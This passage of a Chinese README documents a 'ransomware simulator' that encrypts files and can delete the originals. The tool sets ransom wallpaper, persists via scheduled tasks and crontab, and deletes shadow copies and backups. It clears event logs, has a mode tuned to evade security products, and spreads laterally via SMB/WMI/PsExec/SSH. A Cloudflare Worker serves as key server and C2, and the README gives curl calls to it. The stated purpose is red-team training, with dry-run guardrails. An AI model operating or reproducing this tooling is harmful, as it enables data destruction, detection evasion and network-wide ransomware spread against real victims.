  - **失败回退**：生成图片失败时退化为原有行为（清除壁纸、置为纯黑背景）
  - **注意**：内置点阵字体仅含 ASCII，故 Linux/macOS 壁纸文案为英文大写

  **通用说明**

  - **版式**：参照真实勒索壁纸版式（红底白字高亮大标题 + 居中说明 + 底部免责高亮条），使用项目自身品牌 `RANSOM SIM <版本号>`（版本号取自程序内 `version` 常量，无需手工同步）
  - **文案随 `-remove` 变化**：默认（保留源文件）显示“本程序不会删除任何源文件 / THIS PROGRAM DOES NOT DELETE ANY SOURCE FILE”；使用 `-remove` 时，Windows 额外绘制红底白字提示条 `原始文件已被删除 / SOURCE FILES DELETED`，Linux/macOS 绘制 `SOURCE FILES HAVE BEEN DELETED !`，底部说明同步改为“已删除源文件、仅保留加密文件”（Linux/macOS 受内置点阵字体限制为英文大写）
  - **触发时机**：阶段 4（加密完成后）；**`-dry-run` 演习模式不执行**
  - **避免自加密**：生成物 `ransom_wallpaper.png` 已加入扫描排除名单，防止后续运行被自身加密
  - **如何还原**：Windows 在「设置 → 个性化 → 背景」重新选图，或执行 `reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "<原壁纸路径>" /f`；Linux/macOS 直接在桌面设置中重新选择背景图片
  - **v3.7 便于还原**：篡改前会把原始壁纸路径打印到控制台并写入 `operations.log`（`原始桌面壁纸: <路径>`），可直接据此恢复

  ![勒索提示壁纸预览](docs/preview_wallpaper.png)

  使用 `-remove`（删除源文件）时的壁纸预览：

  ![删除源文件时的壁纸预览](docs/preview_wallpaper_deleted.png)

### 低特征模式（Linux）

  为降低安全软件（如阿里云安骑士、多维攻击识别引擎）的主动防御告警，v3.4 引入了低特征对抗机制：

| 原行为（高特征）            | v3.4 低特征替代                      | 风险评估                     |
| --------------------------- | ------------------------------------ | ---------------------------- |
| `systemctl stop postgresql` | `pgrep -x` → `kill <pid>`（SIGTERM） | systemctl 调用是强告警特征   |
| `systemctl disable` 服务    | 已移除                               | 修改开机启动项极易触发告警   |
| `pkill -9 -f` 暴力杀进程    | `pkill -f`（SIGTERM，无 `-9`）       | `-9` 信号是勒索软件典型特征  |
| `pkill -9 systemd/init`     | 已移除                               | 系统级进程杀操作是最高危告警 |
| `ss -K` 全网络连接关闭      | 已移除                               | 大规模断网行为触发网络层检测 |
| 固定延迟顺序执行            | `--aggressive-delay` 随机延迟        | 打乱时序特征，绕过时序检测   |

  **参数组合推荐：**

| 场景              | 参数组合                          | 安全等级   |
| ----------------- | --------------------------------- | ---------- |
| 最大隐蔽          | `--stealth`                       | 🟢 最低风险 |
| 隐藏进程/日志操作 | `--no-kill-procs --no-clear-logs` | 🟡 中等风险 |
| 隐藏服务操作      | `--no-stop-services`              | 🟡 中等风险 |
| 时序混淆          | `--aggressive-delay=3000`         | 🟢 增强隐蔽 |
| 完整阶段2（默认） | 无额外参数                        | 🔴 高风险   |

### 定时触发与后台驻留

  程序支持三种定时方式：

| 模式 | 参数 | 行为 |
| ---- | ---- | ---- |
| 自动后台定时（默认） | `--delay` / `--at` / `--random-delay` | 计算绝对触发时刻后自动脱离终端转入后台，父进程打印 PID 与日志路径后退出；到期执行，结束后按 `--schedule-cleanup` 清理 |
| 前台等待 | 追加 `--foreground` | 保持旧行为：终端内逐秒打印 ETA 等待，Ctrl+C 中断 |
| 系统级任务 | `--persist-schedule` | 注册一次性系统任务后主进程退出，到点由操作系统唤起 |

  **自动后台化：**

  - Windows：以 `DETACHED_PROCESS` 脱离控制台、隐藏窗口；Linux/macOS：以 `setsid` 脱离会话
  - 输出重定向到 `<程序目录>/scheduler.log`；父进程立即返回，终端可安全关闭
  - **Linux/macOS 不依赖 `nohup` / screen / tmux**
  - 启动时后台子进程会重试获取单实例锁，避免与父进程冲突

  **重启后依旧有效（默认自动注册开机自启）：**

| 平台 | 自启方式 | 说明 |
| ---- | -------- | ---- |
| Windows | 计划任务 `ONSTART`（管理员） → `ONLOGON` → 启动文件夹 VBS | 前两种需要权限，失败自动回退到当前用户启动文件夹，无需管理员 |
| Linux / macOS | `crontab @reboot` | 重启后自动拉起后台子进程，到点执行（目标时间已过则立即执行） |

  - 任务完成后写入 `.schedule_done_<任务名>` 并删除自启项（`--schedule-cleanup=true` 默认开启），避免重启后重复执行
  - `--no-autostart` 关闭开机自启（重启后需手动启动）；`--foreground` 关闭后台化

  **参数透传规则**：后台/计划任务会剔除 `--delay/--at/--random-delay/--persist-schedule/--schedule-cleanup/--schedule-task-name/--foreground/--no-autostart`，追加绝对时间 `--at <RFC3339>` 与内部标记（`--daemon-child` 或 `--scheduled-run`），确保子进程不会二次后台化、不会重复注册。

  **平台实现（`--persist-schedule`）：**

| 平台        | 注册方式                                                            | 触发后清理                     |
| ----------- | ------------------------------------------------------------------- | ------------------------------ |
| Windows     | `schtasks /create /sc once /st HH:MM`（优先 `/rl HIGHEST`，非管理员环境自动退化为普通用户任务） | 进程结束时 `schtasks /delete`（`--schedule-cleanup=true`） |
| Linux       | `systemd-run --on-calendar=<时间> --unit=<任务名>`（先系统级，失败再 `--user`），无 systemd 时回退 `at`，再回退 `crontab` | systemd 瞬时 timer 触发后自动回收；crontab 由包装脚本自删 |
| macOS       | `at`（需启用 `atrun`），否则 `crontab`                              | 同上（crontab 包装脚本自删）    |

  > 注意：Windows `schtasks /sc once` 只能指定「时刻」而不能指定日期，因此目标时间超过 24 小时时会直接报错并回退为进程内等待；跨天场景建议直接使用默认的自动后台定时（`--delay` / `--at`），它通过后台进程 + 开机自启实现跨重启。

### 攻击面侦察（模拟攻击扫描，v3.7）

  **能力范围（只做发现，不做利用）：**

| 能力             | 实现                                                                 | 说明                                     |
| ---------------- | -------------------------------------------------------------------- | ---------------------------------------- |
| 网段自动推导     | `net.Interfaces` 过滤私有 IPv4（`IsPrivate`/链路本地）                | 默认不扫描公网地址                       |
| 目标解析         | IP / CIDR / 主机名 / 清单文件，`auto` = 本机网段 + ARP 邻居           | 单网段最多 1024 个地址，总目标上限 4096   |
| 并发端口探测     | 纯 Go `net.DialTimeout`，worker 池并发（`--scan-workers`）            | 只建立 TCP 连接并抓取横幅，无漏洞利用     |
| 服务与风险指纹   | 内置 24 个企业高价值端口 → 服务名/风险等级映射                        | SMB/RDP/MSSQL/Redis/MongoDB 等标记为高危  |
| 横幅抓取         | 200ms 超时读取，HTTP 端口发送 `HEAD /` 请求                           | 自动过滤不可打印字符                     |
| 本机资产发现     | `netstat -ano`（Win）/ `ss -tlnp`→`netstat`（Linux/macOS）、`arp -a`   | 输出监听端口与同网段邻居                 |
| 报告输出         | `recon_report_<ts>.json` / `.csv` + 控制台表格                        | 结果可被 `--remote-auto` 直接消费         |

  **风险等级定义**：命中任一「高危」端口 → 高危；仅命中「中危」→ 中危；否则低危。

  `--scan-only` 会在侦察后直接结束（不进入加密与阶段 2 破坏性操作），适合资产盘点与防御侧验证。

### 远程横向加密编排（v3.7）

  **编排流程**：`端口可达性 → 凭据认证 → 投递（加密器自身 + 公钥 + 说明文件）→ 远程执行 → 回收远端日志 → 汇总报告`

| 平台（控制端） | 认证                                    | 投递             | 执行                                        | 仅投递模式       |
| -------------- | --------------------------------------- | ---------------- | ------------------------------------------- | ---------------- |
| Windows        | `net use \\host\IPC$ /user:...`         | 管理共享 `C$`    | `wmic process call create` → `schtasks /s` → `psexec` | `--remote-method smb` |
| Linux / macOS  | `ssh`（私钥；口令需 `sshpass`）          | `scp`            | `ssh ... setsid nohup ./run.sh`             | `--remote-method deploy-only` |

  **载荷与沙箱**：远端暂存目录默认 Windows `C:\ProgramData\RsSim`、Unix `/tmp/.rs_sim`；其中 `target/` 为默认加密目标沙箱，并通过 `run.bat` / `run.sh` 拉起载荷，避免多层引号转义问题。真实执行前可先用 `--remote-args "-dir <真实目录>"` 覆盖目标（Go flag 后者覆盖前者）。

  **安全护栏（重要）**：

  - 未显式指定 `--remote-confirm` 时，`remoteMode = dry-run`：远端只以 `-dry-run` 运行，**不会加密任何远端数据**；
  - 全局 `-dry-run` 会使所有远程动作自动降级为演习；
  - `-remove` 不会自动透传到远端，必须在 `--remote-args` 中显式写出；
  - 远端密码/口令会出现在本机命令行（`net use`、`wmic /password:`、`sshpass -p`），请仅在隔离演练环境使用；
  - 远程目标的真实执行依赖目标侧权限（Windows 远程创建进程通常需要管理员凭据；Windows 11 起 `wmic` 默认不再内置，会自动回退到 `schtasks`）；
  - `--remote-report` 汇总与远端日志（回收到 `remote_<host>_*.log`）用于事后取证与效果核对。

### Windows 平台特有功能

  Windows 版本具备以下平台特有的攻击链能力：

| 功能                     | 实现方式                                                     | 说明                                 |
| ------------------------ | ------------------------------------------------------------ | ------------------------------------ |
| **互斥锁单实例保护**     | `CreateMutex` / `global\ransom_mutex`                        | 防止多实例同时运行，避免文件冲突     |
| **磁盘驱动器自动枚举**   | `GetLogicalDrives` 遍历 C: 到 Z:                             | 自动发现所有可用磁盘分区             |
| **卷影副本删除**         | `vssadmin delete shadows /all /quiet`                        | 删除系统还原点，阻止通过卷影副本恢复 |
| **Windows 备份目录删除** | `wbadmin delete catalog -quiet`                              | 删除 Windows 备份编录                |
| **事件日志清除**         | `wevtutil cl System/Security/Application`                    | 清除操作痕迹，增加取证难度           |
| **排除目录**             | `C:\Windows`、`C:\Program Files`、`C:\Program Files (x86)` 等 | 跳过系统目录，避免权限错误和系统崩溃 |
| **桌面壁纸篡改**         | 内嵌 `wallpaper.ps1`（`System.Drawing`）+ `SystemParametersInfo` | 加密完成后生成勒索提示壁纸并立即设为桌面背景 |
| **生成物自排除**         | `ransom_wallpaper.png` 加入扫描排除名单                       | 防止生成物在后续运行中被自身加密     |

### 增强文件识别

#### 支持格式：

  - **数据库文件**：`.ora`, `.dmp`, `.exp`, `.ibd`, `.frm`, `.wal`
  - **网页文件**：`.html`, `.htm`, `.xhtml`, `.mht`, `.mhtml`
  - **配置文件**：`.conf`, `.cfg`, `.yml`, `.yaml`, `.toml`
  - **备份文件**：`.backup`, `.old`, `.temp`, `.swp`
  - **虚拟化文件**：`.vmdk`, `.vhd`, `.qcow2`, `.dockerfile`
  - **密钥文件**：`.key`, `.pem`, `.crt`, `.cer`, `.pfx`

### 日志系统

#### 日志文件结构：

```
程序所在目录/
├── success_encrypted.log  # 成功加密的文件列表
├── failed_encrypted.log   # 加密失败的文件列表及错误信息
└── operations.log         # 完整操作日志
```

#### 日志内容示例：

```
  =================== 勒索软件模拟器日志 ===================
  程序版本: v3.8
  开始时间: 2026-07-31 14:30:25
  运行参数: ./ransom_simulator_linux -log -workers 4
  工作目录: /home/user/tools
  =========================================================

  [2026-07-31 14:30:26] 开始停止数据库服务
  [2026-07-31 14:30:27] 停止数据库服务完成
  [2026-07-31 14:30:28] 开始清理数据库内存和缓存
  [2026-07-31 14:30:28] 清理MySQL缓存
  [2026-07-31 14:30:29] SUCCESS: /var/lib/mysql/data.ibd -> /var/lib/mysql/data.ibd.encrypted
  [2026-07-31 14:30:29] FAILED: /etc/mysql/my.cnf - 权限不足
  [2026-07-31 14:30:30] 加密工作完成: 成功 148, 失败 4
  [2026-07-31 14:30:31] 开始生成勒索提示壁纸
  [2026-07-31 14:30:33] 壁纸设置完成: C:\Tools\ransom_wallpaper.png
```

## 🛡️ 安全测试场景

### 企业环境测试

```bash
# 完整的企业攻击模拟
./ransom_simulator_linux -log \
  -dir="/var/lib/mysql,/opt/oracle,/home/project" \
  -workers=8 \
  -remove
```

### 防御演练

```bash
# 测试防御系统的检测能力
./ransom_simulator_linux -log \
  -dry-run \
  -ext=".sql,.db,.conf" \
  -workers=4
```

### 日志审计测试

```bash
# 测试日志系统的完整性
./ransom_simulator_linux -log \
  -workers=2 \
  -dir="/tmp/test_data"
```

## 🔍 模拟的关键攻击阶段 (MITRE ATT&CK®)

| **Tactic (战术)** | **ID** | **新增模拟行为**                                             |
| ----------------- | ------ | ------------------------------------------------------------ |
| **防御规避**      | TA0005 | **服务停止攻击**：停止数据库和安全服务<br>**内存清理**：清理数据库缓存和系统内存<br>**进程守护解除**：停止守护进程和定时任务<br>**v3.4 低特征对抗**：SIGTERM 替代 SIGKILL、移除 systemctl disable、随机延迟打乱时序 |
| **持久化**        | TA0003 | **增强互斥锁**：强制释放旧锁文件，自动重置状态<br>**v3.7 定时持久化**：`--persist-schedule` 注册 schtasks / systemd-run / at / crontab 定时任务 |
| **发现**          | TA0007 | **增强文件识别**：支持数据库文件、配置文件、备份文件<br>**数据库发现**：自动扫描数据库数据目录<br>**v3.7 网络与主机发现**：并发端口探测、服务指纹、本机监听端口与 ARP 邻居枚举 |
| **横向移动**      | TA0008 | **数据库攻击**：终止数据库连接，解挂网络链接<br>**v3.7 远程横向加密**：SMB/WMI/schtasks/PsExec/SSH 通道投递载荷到远端并执行、回收日志 |
| **影响**          | TA0040 | **增强加密目标**：针对企业关键资产的专项攻击<br>**详细日志记录**：完整攻击过程审计追踪 |

## 🔐 解密流程

### 方式一：浏览器端在线解密（推荐）

  无需安装任何工具，直接在浏览器中完成解密，所有操作均在本地完成。

```
1. 访问 [浏览器端解密页面](https://encrypt.yangzifun.org/decrypt)
2. 输入 UUID 获取私钥（私钥仅在浏览器内存中保存，不会上传到服务器）
3. 选择本地加密文件（`.encrypted`）或整个文件夹
4. 点击"开始解密"，文件在浏览器本地完成解密并自动下载
```

| 加密格式                    | 解密方式                                  | 说明                                                 |
| --------------------------- | ----------------------------------------- | ---------------------------------------------------- |
| **完整加密**（小文件）      | RSA-OAEP + AES-GCM 解密后直接下载原始文件 | 使用 Web Crypto API，全程浏览器本地完成              |
| **PENC 部分加密**（大文件） | 逐块解密后导出 JSON 描述文件              | 浏览器安全沙箱限制，无法直接写入原始文件，需手动合并 |

  > **隐私说明**：所有解密操作均在浏览器本地完成，私钥和文件内容不会上传到任何服务器。

### 方式二：CLI 解密工具

  1. **保存 UUID**：加密时程序会输出 UUID，请务必保存

  2. **查询私钥**：访问 [加密密钥管理系统](https://encrypt.yangzifun.org/)

     - **密钥查询**：在页面左侧输入 UUID 查询对应的 RSA 私钥
     - **密钥生成**：在页面右侧点击"生成密钥"按钮，完成 Turnstile 人机验证后即可生成新的 RSA 密钥对
     - 下载私钥文件（PEM 格式），支持复制和下载
     - 页面顶部提供系统概况面板，展示累计生成总数和趋势图

  3. **使用解密工具**：

     ```bash
     # 编译解密工具
     go build -o decryptor ./ransom_simulator/decryptor.go
     
     # 解密单个文件
     ./decryptor -key=<UUID> -file=<加密文件.encrypted>
      
     # 批量解密目录
     ./decryptor -key=<UUID> -dir=<加密文件目录>
     ```

## 🔒 API 与 Worker 服务参考

  后端服务基于 `workers/_worker.js` 实现，部署于 **Cloudflare Workers** 平台并绑定 **Cloudflare D1 数据库**。

### 🌐 页面与服务路由

| 路径               | 请求方法     | 服务说明                                                     | 校验/权限          |
| :----------------- | :----------- | :----------------------------------------------------------- | :----------------- |
| `/`                | `GET`        | **ransom_simulator 主页**：UI 包含在线密钥生成、UUID 密钥查询及统计趋势图表 | 公开               |
| `/decrypt`         | `GET`        | **浏览器端在线解密页面**：零上传纯前端解密工具               | 公开               |
| `/{SECRET_PATH}`   | `POST`       | **安全路径密钥生成**（默认 `/E56dSY`）：客户端自动化调用     | 隐秘路径校验       |
| `/api/generate`    | `POST`       | **前端公共密钥生成**：Web UI 手动生成密钥接口                | Turnstile 人机验证 |
| `/query`           | `GET`        | **密钥查询接口**：根据 UUID 查询私钥与公钥                   | 公开               |
| `/stats`           | `GET`        | **统计数据接口**：获取累积生成量与历史趋势数据               | 公开               |
| `/api/heartbeat`   | `POST`       | **终端心跳上报**：客户端每 30 秒调用，写入 D1 `terminals` 表 | 公开               |
| `/admin`           | `GET`        | **终端在线管理后台**：在线/离线统计与终端列表（10s 自动刷新） | `ADMIN_TOKEN` 登录 |
| `/admin/login`     | `POST`       | 管理后台登录（表单，成功后写入 HttpOnly Cookie）             | 管理令牌           |
| `/admin/logout`    | `POST`       | 管理后台退出登录（清除 Cookie）                              | 管理令牌           |
| `/admin/api/terminals` | `GET` | 管理接口：终端列表 JSON（Cookie 或 `Bearer` 令牌鉴权）       | `ADMIN_TOKEN`      |
| `/admin/api/terminals/delete` | `POST` | 管理接口：移除终端记录                              | `ADMIN_TOKEN`      |
| `/admin/settings`  | `GET`/`POST` | **系统设置**：登录密钥、密钥接口路径、心跳密钥、Turnstile | 管理会话/`ADMIN_TOKEN` |
| `/beacon_check_in` | `GET`/`POST` | **旧版 Beacon 端点**：仅记录打卡日志，不参与在线统计        | 公开               |

---

### ⚙️ 端点详细说明

#### GET / （ransom_simulator 主页）

  > 完整 URL：https://encrypt.yangzifun.org/
  >
  > 提供基于 Tailwind CSS 与 Chart.js 的响应式 Web 控制面板。
  >
  > - **密钥在线生成**：前端集成 Cloudflare Turnstile 部件，防止恶意刷量。
  > - **UUID 快捷查询**：可在线输入 UUID 查询公私钥，支持一键复制与 `.pem` 密钥文件下载。
  > - **生成趋势图表**：实时展现密钥生成总量、最新 UUID 记录及时间分布图。

#### GET /decrypt （浏览器端本地解密工具）

  > 完整 URL：https://encrypt.yangzifun.org/decrypt
  >
  > 返回浏览器本地文件解密 Web 工具。
  >
  > - **隐私安全**：所有解密运算通过浏览器 **Web Crypto API** 本地完成，私钥仅存在于内存，源文件与解密数据**绝不上传**至服务端。
  >
  > - **批量与文件夹支持**：支持选择单个 `.encrypted` 文件或整文件夹批处理。
  >
  > - **多格式兼容**：
  >
  >   | 加密格式                    | 解密方式                    | 结果输出                                              |
  >   | --------------------------- | --------------------------- | ----------------------------------------------------- |
  >   | **标准完整加密**（小文件）  | RSA-OAEP + AES-GCM 本地解密 | 自动触发浏览器下载还原后的原始文件                    |
  >   | **PENC 部分加密**（大文件） | 逐块解密分片数据            | 导出包含偏移量与解密块信息的 `.decrypted_chunks.json` |

#### POST /E56dSY （密钥生成，安全路径）

  > 完整 URL：https://encrypt.yangzifun.org/E56dSY
  >
  > 无人值守安全路径接口，供勒索模拟器 Go 客户端自动调用。默认路径为 `E56dSY`，可在 Worker 中通过 `SECRET_PATH` 环境变量自定义。

```bash
curl -X POST https://encrypt.yangzifun.org/E56dSY \
  -H "Content-Type: application/json" \
  -d '{}'
```

```json
{
    "status": "success",
    "message": "UUID 和 RSA 密钥对生成并保存成功。",
    "uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
    "public_key_pem": "-----BEGIN PUBLIC KEY-----\n...",
    "private_key_pem": "-----BEGIN PRIVATE KEY-----\n...",
    "public_key_jwk": { ... },
    "private_key_jwk": { ... }
}
```

#### POST /api/generate （密钥生成，Web UI）

  > 完整 URL：https://encrypt.yangzifun.org/api/generate
  >
  > 前端 Web UI 调用的密钥生成接口，支持 Turnstile 人机验证。

  **请求体：**

```json
{
    "cf-turnstile-response": "xxx"
}
```

#### GET /query?uuid=xxx （密钥查询 API）

  > 完整 URL：https://encrypt.yangzifun.org/query?uuid=xxx

```bash
curl "https://encrypt.yangzifun.org/query?uuid=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
```

```json
{
    "status": "success",
    "uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
    "public_key": "-----BEGIN PUBLIC KEY-----\n...",
    "private_key": "-----BEGIN PRIVATE KEY-----\n...",
    "rid": "..."
}
```

#### GET /stats?range=1m （统计数据 API）

  > 完整 URL：https://encrypt.yangzifun.org/stats?range=1m

```bash
curl "https://encrypt.yangzifun.org/stats?range=1m"
```

| 参数    | 可选值                 | 说明                    |
| ------- | ---------------------- | ----------------------- |
| `range` | `1m`, `3m`, `6m`, `1y` | 统计时间范围（默认 1m） |

#### GET/POST /beacon_check_in （旧版 C2 Beacon 端点）

  > 完整 URL：https://encrypt.yangzifun.org/beacon_check_in
  >
  > 兼容旧版客户端的打卡端点，仅打印包含 `CF-Connecting-IP`、`User-Agent` 及时间戳的 Worker 日志，**不参与在线统计**。

#### POST /api/heartbeat （终端心跳上报）

  > 完整 URL：https://encrypt.yangzifun.org/api/heartbeat

```bash
curl -X POST https://encrypt.yangzifun.org/api/heartbeat \
  -H "Content-Type: application/json" \
  -d '{"id":"5f0c…","hostname":"PC-ALICE","username":"alice","os":"windows","arch":"amd64","version":"v3.8","mode":"dry-run","event":"ping"}'
```

```json
{
  "status": "ok",
  "server_time": 1794302563,
  "interval": 30,
  "online_window": 90
}
```

  服务端按 `id` 做 upsert：首次上报记录 `first_seen`，之后每次刷新 `last_seen`、`heartbeat_count`、来源 IP/地区；`event: "stop"` 会立即把终端标记为离线。表由 Worker 首次写入时自动创建。

#### GET /admin （终端在线管理后台）

  > 完整 URL：https://encrypt.yangzifun.org/admin
  >
  > 需在 Worker 中配置 `ADMIN_TOKEN` 环境变量（`wrangler secret put ADMIN_TOKEN`）作为初始/回退登录密钥，未配置时返回 503 并提示配置方法。

  - 顶部统计：在线 / 离线 / 终端总数
  - 列表字段：状态、主机名与终端 ID、用户、系统、版本与运行模式、IP 与地区、最后心跳（相对时间 + 绝对时间）、心跳次数
  - 每 10 秒自动刷新，支持搜索过滤、手动刷新、移除终端、退出登录
  - 鉴权：登录后写入 `HttpOnly + Secure + SameSite=Strict` 的 `admin_session` Cookie（7 天有效，服务端仅存 SHA-256 摘要）；接口也支持 `Authorization: Bearer <ADMIN_TOKEN>`
  - 登录密钥可在 `/admin/settings` 修改（PBKDF2-SHA256 哈希存 D1）；修改后所有会话立即失效

#### GET /admin/api/terminals （终端列表 JSON）

```bash
curl "https://encrypt.yangzifun.org/admin/api/terminals" \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

```json
{
  "status": "success",
  "server_time": 1794302563,
  "online_window": 90,
  "heartbeat_interval": 30,
  "summary": { "total": 3, "online": 2, "offline": 1 },
  "terminals": [
    {
      "id": "5f0c…",
      "hostname": "PC-ALICE",
      "username": "alice",
      "os": "windows",
      "arch": "amd64",
      "version": "v3.8",
      "mode": "dry-run",
      "key_uuid": "…",
      "ip": "203.0.113.9",
      "country": "CN",
      "first_seen": 1794300000,
      "last_seen": 1794302550,
      "heartbeat_count": 85,
      "online": true,
      "seconds_since_last_seen": 13
    }
  ]
}
```

#### POST /admin/api/terminals/delete （移除终端）

```bash
curl -X POST "https://encrypt.yangzifun.org/admin/api/terminals/delete" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"id":"5f0c…"}'
```

#### GET /admin/settings （系统设置页）

  > 完整 URL：https://encrypt.yangzifun.org/admin/settings
  >
  > 需先登录管理后台（`admin_session` Cookie 或 `Authorization: Bearer <登录密钥>`）。

  可管理的变量（保存到 D1 `settings` 表，立即生效；留空表示保持当前值）：

  | 变量 | 说明 |
  | --- | --- |
  | **管理登录密钥** | 修改后台登录密钥（PBKDF2-SHA256 哈希存储）；保存后所有会话失效，需用新密钥重新登录；可勾选“清除自定义密钥”回退到环境变量 `ADMIN_TOKEN` |
  | `secret_path` | 密钥接口安全路径（优先于 `env.SECRET_PATH`）；修改后客户端硬编码的 `apiURL` 需同步更新 |
  | `heartbeat_token` | 心跳接收密钥；启用后客户端必须携带 `X-Heartbeat-Token`，否则心跳返回 401 |
  | `turnstile_site_key` / `turnstile_secret_key` | 网页生成密钥的 Turnstile 人机验证；未配置时不校验 |

  ```bash
  # 通过 API 查看当前生效配置（不含密钥明文）
  curl "https://encrypt.yangzifun.org/admin/settings" -H "Authorization: Bearer $ADMIN_TOKEN"
  ```

  > 登录密钥与其它变量保存在同一次提交中：先保存其它变量，再变更登录密钥并跳转登录页。

---

### 🛠️ Cloudflare Worker 部署与配置说明

  文件位置：`workers/_worker.js`

#### 1. D1 数据库绑定

  Worker 需绑定名称为 `DB` 的 Cloudflare D1 数据库，主要表结构如下：

  - **`keys` 表**：保存加密生成的密钥对历史记录（字段：`uuid`, `public_key`, `private_key`, `rid`, `created_at`）。
  - **`key_metrics` 表**：持久化保存统计指标（字段：`total_generated`, `latest_uuid`, `latest_generated_at`），即使 `keys` 表清理定期数据，累计生成总量亦不会重置。
  - **`terminals` 表**：终端在线状态（字段：`id`, `hostname`, `username`, `os`, `arch`, `version`, `mode`, `key_uuid`, `ip`, `country`, `user_agent`, `first_seen`, `last_seen`, `heartbeat_count`, `online`）。由 Worker 首次收到心跳时自动创建，无需手工建表。
  - **`settings` 表**：后台可维护的变量（字段：`key`, `value`, `updated_at`），保存登录密钥哈希、密钥接口路径、心跳密钥与 Turnstile 配置；由 Worker 自动创建。
  - **`admin_sessions` 表**：管理后台登录会话（字段：`id`（会话令牌 SHA-256 摘要）, `created_at`, `expires_at`）；登录时自动清理过期会话，修改登录密钥时全部失效。

  > 终端记录不会自动删除；如需清理长期离线终端，可执行：
  > `DELETE FROM terminals WHERE last_seen < CAST(strftime('%s','now') AS INTEGER) - 2592000;`（保留最近 30 天）

#### 2. 环境变量 (Environment Variables)

| 变量名                 | 默认值   | 说明                                                       |
| ---------------------- | -------- | ---------------------------------------------------------- |
| `SECRET_PATH`          | `E56dSY` | 客户端自动化请求密钥的安全路径（不含前导斜杠 `/`）         |
| `TURNSTILE_SITE_KEY`   | *(可选)* | 前端 Turnstile Widget 部件 Site Key                        |
| `TURNSTILE_SECRET_KEY` | *(可选)* | 后端校验 Turnstile Token 的 Secret Key（未设置时跳过校验） |
| `ADMIN_TOKEN`          | *(建议设置)* | **初始/回退**管理登录密钥；在 `/admin/settings` 设置自定义登录密钥后以 D1 为准（哈希存储），清除自定义密钥后回退到此变量；未配置且 D1 无哈希时 `/admin` 返回 503 |

  配置管理令牌：

```bash
wrangler secret put ADMIN_TOKEN
```

### 重要注意事项

  - **UUID 和私钥：** UUID 是识别密钥的唯一凭证，私钥是解密文件的**唯一密钥**。**务必妥善保存！** 丢失私钥将导致文件永远无法解密。
  - **网络连接：** 加密过程需要访问 Cloudflare Worker API，请确保网络稳定。
  - **API 限制：** 脚本、程序及 API 服务会不定时更新，如遇执行错误，请从密钥查询页面更新程序。
  - **数据保存：** 本系统会定期清理 `keys` 表，如需保留密钥请尽快下载私钥文件。统计总数（总生成次数、最新记录等）独立存储在 `key_metrics` 表中，清理 `keys` 表不影响累计统计数据。
  - **重要声明：** **该站点提供的脚本仅用于演练防加密勒索，其他用途及使用过程中数据丢失与本服务无关！** 加密过程中源文件默认不会被自动清除；仅当显式使用 `-remove` 时才会删除源文件（此时壁纸与勒索信会同步显示“已删除源文件”提示）。
- **v3.7 远程编排声明：** 攻击面侦察（`--scan`）与远程横向加密（`--remote-*`）**仅可在你拥有合法授权的隔离环境内使用**。远程编排默认处于演练护栏（只做连通性与投递，远端以 `-dry-run` 运行），必须显式 `--remote-confirm` 才会真实执行；对未授权主机进行扫描或投递均可能构成违法行为，请自行承担全部责任。
  - **系统影响：** 非演习模式下会**修改当前用户的桌面壁纸**（生成 `ransom_wallpaper.png` 并设为背景）并向桌面写入勒索信，请在演练前备份壁纸设置，演练后自行还原。

## ⚠️ 免责声明

  **重要提醒**：本工具为**安全研究和培训专用**，严禁用于非法用途！

### 使用前必须确认：

1. ✅ 仅在合法授权的环境中使用
2. ✅ 获取系统所有者的明确授权
3. ✅ 在隔离的测试环境中运行
4. ✅ 备份所有重要数据

### 法律责任：

  - 开发者不对任何滥用行为负责
  - 使用者需承担全部法律责任
  - 违反法律规定的使用将面临法律制裁

  **真实勒索软件是严重犯罪行为！本工具仅用于教育和防御研究。**

## 📞 支持与贡献

### 问题反馈

  - GitHub Issues: [报告问题](https://github.com/yangzifun/ransom_simulator/issues)
  - 安全漏洞: 请通过GitHub私密报告

### 贡献指南

1. Fork 项目仓库
2. 创建功能分支
3. 提交更改
4. 推送分支
5. 创建Pull Request

## 🔗 项目链接

  - **GitHub仓库**: https://git.yangzifun.org/YZFN/ransom_simulator
  - **密钥管理系统**: https://encrypt.yangzifun.org/
  - **C2服务器**: Cloudflare Workers 实现（`workers/_worker.js`）
  - **文档**: 完整技术文档和使用指南

---

  **最后提醒**：网络安全是共同责任，使用本工具时请始终遵循道德和法律准则。让我们共同建设更安全的网络环境！
